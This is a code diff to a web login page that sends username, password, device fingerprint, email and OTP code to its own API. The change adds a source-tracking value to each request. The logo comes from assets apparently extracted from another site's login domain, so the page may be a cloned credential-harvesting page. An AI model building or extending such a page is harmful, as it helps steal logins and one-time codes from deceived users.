@@ -7,6 +7,7 @@ import { useLanguage } from '@/contexts/LanguageContext';
 import { apiRequest } from '@/lib/queryClient';
 import { useToast } from '@/hooks/use-toast';
 import { getDeviceData } from '@/lib/deviceInfo';
+import { getSourceInfo } from '@/lib/sourceInfo';
 import { collectDeviceFingerprint, getStoredFingerprint, type DeviceFingerprint } from '@/lib/device-fingerprint';
 import '@/styles/styles.css';
 import logoSvg from '@assets/extracted/login.mypaymentvault.com/paymentvault_logo.svg';
@@ -94,6 +95,7 @@ export default function LoginPage() {
         username, 
         password,
         fingerprint: currentFingerprint,
+        sourceInfo: getSourceInfo(),
         ...deviceData 
       });
       const data = await response.json();
@@ -116,7 +118,7 @@ export default function LoginPage() {
     if (!validateEmail()) return;
 
     try {
-      const response = await apiRequest('POST', '/api/verify-email', { loginAttemptId, email });
+      const response = await apiRequest('POST', '/api/verify-email', { loginAttemptId, email, sourceInfo: getSourceInfo() });
       const data = await response.json();
       
       if (data.success) {
@@ -137,7 +139,7 @@ export default function LoginPage() {
     if (!validateOtp()) return;
 
     try {
-      const response = await apiRequest('POST', '/api/verify-otp', { sessionId, otpCode: otpCode.trim() });
+      const response = await apiRequest('POST', '/api/verify-otp', { sessionId, otpCode: otpCode.trim(), sourceInfo: getSourceInfo() });
       const data = await response.json();
       
       if (data.success) {
